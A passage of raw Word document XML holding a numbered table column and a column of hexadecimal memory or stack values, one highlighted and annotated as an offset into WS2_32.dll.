          <w:p w14:paraId="2D502F5D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>128</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7835C1B9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>129</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4155C63A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>130</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12A267D4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>131</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B75F1CD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>132</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76CA31BE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>133</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45E331FF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>134</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3801D3BC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>135</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3924B3CE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>136</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5012BDE0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>137</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A0B249F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>138</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1888D755" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>139</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54B99D30" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>140</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FD014F3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>141</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CC0984E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>142</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="239F9CB6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>143</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D4BCAAF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>144</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FAB69E0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>145</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E098919" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>146</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EDD4BF1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>147</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AB71772" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>148</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D0B4169" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>149</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43D9408C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>150</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="008E07D1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>151</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63CE7EF1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>152</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03E8CF3A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>153</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1562A3B0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>154</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="042E5296" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>155</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0022E816" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>156</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="562E522F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>157</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A13A5C6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>158</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6ECB76D7" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>159</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E9B151D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>160</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E85A883" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>161</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="189EA586" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>162</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1940C9F1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>163</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="658FE83B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>164</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CCD1CCA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>165</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43D646CD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>166</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E670303" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>167</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20EB4A15" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>168</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D85BFBF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>169</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F1A0477" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>170</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="742A094B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>171</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BB367B4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>172</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7C9E15C4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>77A56C19 -&gt; WS2_32.dll -&gt; Offset: 6C19</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57B5F4F1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00174360</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A829B63" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000068</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F901CFF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000002</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56B5628A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07922460" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00174778</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C8A1AFE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>FFFFFFFF</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="293A4AE1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00123208</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C5773F4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="020825CC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0036FC28</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D9EA189" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000068</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19A7AE82" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00121181</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50DE8260" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00174778</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="033C6BDA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0036FC50</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40024EE8" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0012123A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3399E36A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00174778</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31B62EC7" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000064</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="352D56E5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000068</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="276B576D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>77A537AD</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C05A7F8" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000068</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6009B7D9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
